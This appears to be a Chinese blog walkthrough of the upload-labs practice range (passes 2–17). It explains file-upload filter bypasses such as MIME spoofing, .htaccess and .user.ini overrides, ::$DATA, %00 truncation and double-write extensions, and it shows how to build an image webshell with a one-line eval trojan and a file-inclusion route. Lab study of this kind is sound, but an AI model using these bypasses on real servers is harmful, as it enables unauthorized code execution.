<h3 id="姿势二-MINE绕过"><a href="#姿势二-MINE绕过" class="headerlink" title="姿势二 MINE绕过"></a>姿势二 MINE绕过</h3><p>我们从上一个方法可以了解到只要Content-Type所表示的文件格式为照片文件就可以成功上传那么我们就可以直接上传php文件然后修改Content-Type以此来绕过<br><img src="/2023/12/15/upload-labs/2-2.png" class="" title="Alt text"><br>我们直接将Content-Type改为image/jpeg成功上传</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// 标志文件是否成功上传的变量</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// 存储上传结果消息的变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123; <span class="comment">// 检查上传目录是否存在</span></span><br><span class="line">        <span class="comment">// 检查上传文件的类型是否是允许的图片类型（JPEG、PNG、GIF）</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) ||</span><br><span class="line">            (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) ||</span><br><span class="line">            (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// 临时副本</span></span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; </span><br><span class="line">            <span class="comment">// 上传文件的目标路径(就是将目录和名字还/用.来拼接)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将临时文件移动到目标路径</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// 标记文件上传成功</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>; <span class="comment">// 文件移动失败时的错误消息</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>; <span class="comment">// 文件类型不符合要求时的错误消息</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在，请手工创建！&#x27;</span>; <span class="comment">// 上传目录不存在时的错误消息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>move_uploaded_file($temp_file, $img_path)</code>函数把上传的文件移动到新位置。<br>如果成功该函数返回 TRUE，如果失败则返回 FALSE。<br>语法：<br>move_uploaded_file(file,newloc)<br>file 必需。规定要移动的文件。<br>newloc 必需。规定文件的新位置。<br>通过分析我们可以知道，这个源码是将文件的MIME类型进行比较，如果为照片类型且文件没有重复上传则可以进行上传</p>
<h1 id="pass-03-php4-5绕过，pb重发器响应查看随机数文件名字"><a href="#pass-03-php4-5绕过，pb重发器响应查看随机数文件名字" class="headerlink" title="pass-03 php4,5绕过，pb重发器响应查看随机数文件名字"></a>pass-03 php4,5绕过，pb重发器响应查看随机数文件名字</h1><p>该题目使用虽然禁止了php，但是没有禁止php2，php3，php4，php5,PHTML,pht等<br>但是我们可以看到多了一个代码<code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code>我们都知道$img_path变量为文件上传的路径，而该题目和其他题目有所不同该题目的文件路径名也就是变量$img_path为文件名UPLOAD_PATH加上/在加上date(“YmdHis”)也就是系统时间在加上rand(1000,9999)也就是1000到9999的随机数。<br>使用这题我们需要用bp抓包利用重发器，后再查看响应之后便可以查看到上传的文件位置。</p>
<h1 id="pass-04-htaccess绕过"><a href="#pass-04-htaccess绕过" class="headerlink" title="pass-04 .htaccess绕过"></a>pass-04 .htaccess绕过</h1><img src="/2023/12/15/upload-labs/4-1.png" class="">
<p>我们可以看到基本上把所有的文件都给禁了那么就需要请出分布式配置文件.htaccess了，这个文件与apache部署的网站有关，httpd.conf就是apache服务器的配置文件，但是由于在多人开发时，随意修改http.conf文件会导致配置可能出现问题，那么我们就需要使用分布式配置文件.htaccess了。这个文件会与httpd.conf相似。会将覆盖该文件的目录及其子目录下的http.conf的全局配置那么我们就可以利用这个文件来将修改其配置使我们成功上传。<br>1.修改配置使其将jpg文件当成php执行。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><br>我们只要上传.htaccess在上传.png的一句话木马在用蚁剑连接即可。<br>2.若文件名包含.php关键词便按照php文件运行<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddHandler php5-script .php</span><br></pre></td></tr></table></figure><br>3.指定文件名称使其以php形式执行<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FileMatch &quot;muma&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure><br>直接上传一个名字包含muma的文件后，使用蚁剑<br>strrchr($file_name, ‘.’)<br>反会最后一个.及其后面的字符串<br>trim($_FILES[‘upload_file’][‘name’]);<br>删去两边空格</p>
<h1 id="pass-05-user-ini绕过"><a href="#pass-05-user-ini绕过" class="headerlink" title="pass-05 .user.ini绕过"></a>pass-05 .user.ini绕过</h1><p>这道题目我们发现连.htaccess都过滤了，那么我们观察源码发现只有对点和空格进行一次删除给那么我们就可以用bp抓包将后面的后缀改为php. .同理前面的题目也可以这么绕过。</p>
<h1 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h1><p>这题目我们可以使用种php的配置文件叫做.user.ini。我们知道php.ini而.user.ini文件是php的配置文件这个是php的用户级配置文件，因为这关的没有禁用php用户级配置文件即.user.ini所有我们可以使用这个配置文件进行文件上传。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepand_file=muma.jpg</span><br></pre></td></tr></table></figure><br>上面的意思为将muma.jpg的内容拼接到所有php文件里<br>然后我们上传.user.ini在上传muma.jpg这样就会是muma.jpg的内容被拼接的php文件里</p>
<h1 id="pass-06-大小写绕过"><a href="#pass-06-大小写绕过" class="headerlink" title="pass-06 大小写绕过"></a>pass-06 大小写绕过</h1><img src="/2023/12/15/upload-labs/5-1.png" class="" title="Alt text">
<p>这道题目我们审查代码发现了一个问题就是缺少了strtolower()函数导致我们上传的文件名不会被改为小写。而字符串的匹配函数in_array()匹配字符串是否存在于数组中这也就导致我们可以使用大写的PHP以此来绕过因为大写PHP不在数组deny_ext。所有我们可以绕过</p>
<h1 id="pass-07-空格绕过"><a href="#pass-07-空格绕过" class="headerlink" title="pass-07 空格绕过"></a>pass-07 空格绕过</h1><p>这道题目我们查看源码发现其因为缺少了trim()函数所有我们可以使用空格绕过就是再后锥后加一个空格。我们再仔细看看会发现这道题目在的文件上传目录又使用了时间和随机数那么我们就仍然还是使用bp查看响应查找文件名字。<br><img src="/2023/12/15/upload-labs/7-1.png" class="" title="Alt text"></p>
<h1 id="pass-08-点绕过"><a href="#pass-08-点绕过" class="headerlink" title="pass-08 点绕过"></a>pass-08 点绕过</h1><p>观察这题的源码我们发现其缺少了一个函数deldot()函数（删除字符串末尾点的函数）又因为windows会自己将末尾落单的空格和.会自己删除，我们可以在末尾添加一个.来绕过这道题目。</p>
<h1 id="pass-09-DATA绕过"><a href="#pass-09-DATA绕过" class="headerlink" title="pass-09 ::$DATA绕过"></a>pass-09 ::$DATA绕过</h1><p>该题目我们查看源码可以发现其缺少了一个将字符串::$DATA变为空的替换函数str_ireplace()这样导致了我们可以将文件后缀名改为<code>.php::$DATA</code>因为windows会将<code>`::$DATA</code>后面的的数据当成文件流处理，windows会<code>::$DATA</code>忽略即我们上传道windows主机后文件后缀名变为了php。而在进行检测时函数所提取出来的文件后缀名为<code>.php::$DATA</code>使用我们可以使用<code>::$DATA</code>来绕过文件后缀检测<br>我们用bp抓包在后缀添加<code>::$DATA</code>上传文件。又因为该题目又会将名字改为一大串数子所有我们要再查看响应来查看文件上传的文件名。</p>
<h1 id="pass-10-点空格绕过"><a href="#pass-10-点空格绕过" class="headerlink" title="pass-10 点空格绕过"></a>pass-10 点空格绕过</h1><p>我们查看提示发现只能上传图片文件，但是我们又无法上传分布式配置文件.htaccess和用户配置文件,.user.ini所以该题目我们只能使用</p>
<h2 id="点空格绕过："><a href="#点空格绕过：" class="headerlink" title="点空格绕过："></a>点空格绕过：</h2><p>我们从源码可以看到该源码只将空格和点检测一次所以我们可以使用<code>. .</code>这回导致函数将点删除后遇到空格后停止删除之后再清除空格这个就会导致只删除了一个点和空格这样就会导致留下一个点这就会使上传成功。</p>
<h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><p>该题目我们可以查看源码发现其过滤函数从in_array变为了ireplace()的替换函数只要出现php就会直接删除，该题目我们可以采取双写绕过，该题目检测字符进行替换是从左到右的所以我们需要将php变为pphphp这样在上传后就会变为php，但是注意不可以使用phphpp这样会导致先替换最左边的php导致上传的文件后缀变为.hpp。</p>
<h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><p>该题目我们阅读源码发现我们可以利用GET传值控制文件路径，这时候我们要引入一个概念%00截断，在文件路径中只要遇到%00就会停止，也就是说我们可以用bp抓包然后用get传值传入一个路径如upload/muma.php%00,这样%00就会起到截断作用使之后的添加的路径失效，也就是文件名变为了muma.php注意%00截断需要在5.3.4版本以下的php才可以起到作用</p>
<h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><p>该题目我们查看源码可以发现其于路径可由post传参来控制，那么我们的思路就和上一题一样利用bp抓包来传值一个路径，再使用%00截断，注意因为post无法解析url编码我们有以下两种方法解决<br>1.使用url解码<br><img src="/2023/12/15/upload-labs/13-2.png" class="" title="Alt text"></p>
<p>2.将其转化为16进制编码<br><img src="/2023/12/15/upload-labs/13-1.png" class="" title="Alt text"></p>
<h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>审查该代码我们可以发现这个getReailfileType()的函数的作用为根据文件的名称来以二进制的方法打开文件，再使用fread()函数来读取两个字节，这两个字节为文件头，而文件头就记载着文件的类型，不同类型的文件文件头也不相同，之后使用@unpack函数来将两个字节的二进制代码解包成两个字符，这两个字符以数组的形式保存再变量里，其下标名为char1和char2，之后再利用intval来将两个字符转换为10进制的整形。之后再将数值与switch函数里的case进行比较，这样就可以得到文件的真正类型。就是因为这个原因导致我们无法上传其他文件。<br>由于修改文件的后缀并不会影响其文件头所以我们就是修改文件的后缀也无法上传php文件<br>该题目需要我们上传一个图片马，也就是将一个图片和一句话木马合成成一个图片文件，当然图片马也表示任何题目都可以使用的。</p>
<h2 id="图片马的使用条件"><a href="#图片马的使用条件" class="headerlink" title="图片马的使用条件"></a>图片马的使用条件</h2><p>只有当题目如果出现文件包含漏洞如include $flag这个flag可控的时候才可以使用。<br>由于这种函数会直接将包含的文件当成php文件执行所以当出现文件包含漏洞时我们上传图片马，并使图片马被包含这样服务器就会执行图片里的php代码我们就可以成功过关。</p>
<h2 id="图片马的制作"><a href="#图片马的制作" class="headerlink" title="图片马的制作"></a>图片马的制作</h2><p>我上面有说图片马使用利用一个图片和一句话木马拼接成的新图片<br>我们可以使用windows自带的cmd来进行拼接。我们在该目录下的顶上的目录上输入cmd如下<br><img src="/2023/12/15/upload-labs/14-2.png" class="" title="Alt text"><br>打开cmd然后输入以下代码<br><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.png/b+muma.php/a a.png</span><br></pre></td></tr></table></figure><br>这样我们就成功创造了一个图片马，a.png我们使用010打开这个图片我们可以看见其文件的尾部包含了一句话木马，用010打开<br><img src="/2023/12/15/upload-labs/14-1.png" class="" title="Alt text"><br>这时我们上传该图片马查看代码我们可以看到其文件名又变成了随机数，那么我们就仍然需要使用bp来查看响应。<br>我们可以在该靶场在文件目录中存在着文件包含漏洞的代码文件include.php而且在include.php的同一级文件夹下存在upload文件夹upload文件夹下就是我们所存的图片马。<br><img src="/2023/12/15/upload-labs/14-7.png" class="" title="Alt text"><br>我们用get传值<code>upload/图片马名称</code>进行文件包含（由于直接导入一句话木马只回显一堆乱码所以我加了一个phpinfo()方便查看）<br><img src="/2023/12/15/upload-labs/14-5.png" class="" title="Alt text"><br>可以看见我们成功导入了这个文件</p>
<h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><p>这道题目和14关没有什么区别只是过滤的方法发生了改变<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="分析代码，getimagesize-这个函数的作用使取得图片文件的属，保存成数组"><a href="#分析代码，getimagesize-这个函数的作用使取得图片文件的属，保存成数组" class="headerlink" title="分析代码，getimagesize()这个函数的作用使取得图片文件的属，保存成数组"></a>分析代码，getimagesize()这个函数的作用使取得图片文件的属，保存成数组</h3><p>索引0为像素值宽度。<br>索引1为像素值高度.<br>索引2为图片的类型<br>索引3给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <code>&lt;image&gt;</code>标签索引 bits 给出的是像的每种颜色的位数，二进制格式<br>索引 channels 给出的是图像的通道值，RGB 图像默认是 3<br>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image/jpeg”);</p>
<h3 id="函数image-type-to-extension-的参数值为整形，返回值为图像文件的后缀"><a href="#函数image-type-to-extension-的参数值为整形，返回值为图像文件的后缀" class="headerlink" title="函数image_type_to_extension()的参数值为整形，返回值为图像文件的后缀"></a>函数image_type_to_extension()的参数值为整形，返回值为图像文件的后缀</h3><p>1.为gif<br>2.为jpeg<br>3.为png</p>
<h3 id="stripos"><a href="#stripos" class="headerlink" title="stripos"></a>stripos</h3><p>返回的值为字符串ext在types出现的位置，如果匹配不到返回false</p>
<p>所以这到题目我们仍然使用图片马进行绕过<br>1：使用bp上传图片马，查看重发器响应里的文件上传名称和位置<br><img src="/2023/12/15/upload-labs/15-1.png" class="" title="Alt text"><br>2：使用服务器目录下的include.php文件包含上传的图片马<br><img src="/2023/12/15/upload-labs/15-2.png" class="" title="Alt text"></p>
<h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><p>该题目与上面的题目没有大区别所以我们直接审计代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>上面是判断是否为图片类型的function，<code>exif_imagetype($filename)</code>该函数是判断图片的类型的函数，返回内容为图片的MIME值,<code>$filename</code>是文件的路径<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMAGETYPE_GIF gif文件</span><br><span class="line">IMAGETYPE_JPEG jpeg文件</span><br><span class="line">IMAGETYPE_PNG png文件</span><br></pre></td></tr></table></figure><br>之后的操作如上一题我就不多赘述了。注意要开启php的exif模块</p>
<h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><p>其中这个代码中的@表示无错误提示符，即使出现错误也不会报错，因为我们这个一句话木马中的1这个变量是没有定义的，这也就导致了我们在正常运行时会出现报错，但是由于这个@，使得不会出现报错可以运行下去,而eval()是php中一个函数，这个函数会将字符串当成代码运行，而$_POST[]是使用post传值，这样我们就可以使用这个一句话木马，像服务器不断发送代码以此来查询数据。而我们常使用的蚁剑的原理就是向一句木马传入大量的语句，以此来得到许多的权限。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">    $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename);</span><br><span class="line"></span><br><span class="line">    // 获得上传文件的扩展名</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们对上述代码进行审计，substr(strrchr($filename,”.”),1);strrchr($filename, “.”)：这个函数返回 $filename 字符串中最后一个点（.）及其后面的部分。它返回的是从最后一个点开始到字符串末尾的所有字符，包括点本身。如果在文件名中找不到点，它将返回 false。函数substr(str,1)是返回第二个开始的字符串</p>
<h2 id="imagecreatfromjpeg-target-path"><a href="#imagecreatfromjpeg-target-path" class="headerlink" title="imagecreatfromjpeg($target_path)"></a>imagecreatfromjpeg($target_path)</h2><p>该函数是创建一个图像标识符，我们可以对图像标识符进行各种各样的图像处理操作如缩放、裁剪、添加水印等。</p>
<h2 id="imagejpeg（图像标识符，路径，控制质量）"><a href="#imagejpeg（图像标识符，路径，控制质量）" class="headerlink" title="imagejpeg（图像标识符，路径，控制质量）"></a>imagejpeg（图像标识符，路径，控制质量）</h2><p>该函数是将图像标识符保存在新路径下,保存成功返回true否则返回false，而第三个参数为控制质量，0最差100最好而默认值为75是一个很高的压缩，这也就会导致该图像文件的二进制编码发生改变，使得我们的图片马里的php代码的二进制编码也发生改变，也就导致了图片马的失效</p>
<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink()"></a>unlink()</h2><p>该函数会删除文件</p>
<p>整合起来的意思就是获取上传文件的图像标识符，将标识符保存在新的路径下（这样保存的文件就只剩下了图片，没有了一句话木马），之后删除原上传文件。也就是对文件进行了二次渲染，二次渲染导致图片马失效的原因是函数imagejpeg()具体原因在上面已经讲过了。</p>
<h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><p>he我们可以尝试使用gif的文件马<br>在对 GIF 图像进行二次渲染时，保留一些内容的原因可能与 GIF 图像的特性有关。GIF 是一种支持无损和有损压缩的图像格式，同时还支持多帧动画。<br>以下是可能导致二次渲染时保留一些内容的原因：</p>
<p>有损压缩： 如果原始 GIF 图像经过有损压缩，渲染并重新保存时可能会损失一些细节。相反，如果使用无损压缩，则可能能够更好地保留原始图像的质量。</p>
<p>颜色表和调色板： GIF 使用调色板（Color Palette）来限制图像中使用的颜色数量。当对 GIF 图像进行渲染时，可能会重新生成调色板或者对现有调色板进行调整，导致颜色的微小变化。</p>
<p>帧合并： GIF 图像可以包含多个帧，形成动画。在重新保存时，可能会对这些帧进行一些处理，例如合并相邻帧以减小文件大小，但这也可能导致一些细微的变化。<br>图像编辑操作： 如果在渲染前对 GIF 图像进行了编辑，如裁剪、调整大小、添加文本等操作，这些操作可能会影响图像内容。</p>
<p>为了更好地理解保留内容的具体原因，建议比较原始 GIF 图像和经过渲染后的 GIF 图像的二进制数据，以查看发生了什么变化。使用二进制文件比较工具或编程语言中的二进制文件比较方法可以帮助你检测图像数据的差异。<br>我们先上传一个gif文件，使用010打开上传后的文件打开可以发现有一大段与原图片是一模一样的，这样我们就可以尝试在未改变的区域写下php代码实现文件上传获取shell<br><img src="/2023/12/15/upload-labs/17-1.png" class="" title="Alt text"></p>
